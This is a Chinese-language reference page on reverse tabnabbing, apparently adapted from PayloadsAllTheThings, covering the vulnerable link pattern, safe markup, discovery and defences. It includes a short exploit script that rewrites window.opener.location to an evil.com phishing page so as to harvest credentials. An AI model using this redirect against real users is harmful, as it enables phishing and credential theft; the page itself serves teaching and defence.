# Tabnabbing - 标签页劫持

[SEARCH_KEYWORDS]
漏洞类型: Tabnabbing Reverse Tabnabbing 标签页劫持 反向标签页劫持
攻击类型: Phishing Credential Theft Session Hijacking
关键词: target _blank rel noopener window.opener tab
技术: window.opener Phishing Page Redirect Credential Harvesting
属性: target="_blank" rel="noopener" rel="noreferrer"

[CONTENT]

## 标签页劫持概述

反向标签页劫持是一种攻击，从目标页面链接的页面能够重写该页面，例如将其替换为钓鱼网站。由于用户最初在正确的页面上，他们不太可能注意到它已被更改为钓鱼网站。

## 漏洞条件

当链接满足以下条件时存在漏洞：
- `target` 属性包含 `_blank`
- `rel` 属性不包含 `noopener`

### 漏洞示例

```html
<a href="..." target="_blank" rel="">
<a href="..." target="_blank">
```

### 安全示例

```html
<a href="..." target="_blank" rel="noopener noreferrer">
```

## 攻击流程

1. 攻击者发布指向其控制的网站的链接，包含JS代码：
   ```js
   window.opener.location = "http://evil.com"
   ```

2. 诱骗受害者在新标签页中访问链接

3. JS代码执行，后台标签页重定向到evil.com（钓鱼网站）

4. 受害者打开后台标签页，看到登录页面

5. 受害者尝试登录，攻击者获取凭证

## 利用代码

攻击者控制的页面：

```html
<script>
  if (window.opener) {
    window.opener.location = "https://evil.com/phishing.html";
  }
</script>
```

## 发现方法

在目标网站搜索：

```html
<a href="..." target="_blank" rel="">
<a href="..." target="_blank">
```

## 防护措施

1. 始终在`target="_blank"`链接中添加`rel="noopener noreferrer"`
2. 对用户生成内容进行过滤
3. 使用CSP限制

## 工具

- discovering-reversetabnabbing - Burp扩展

## 参考文档

原始来源: PayloadsAllTheThings/Tabnabbing/README.md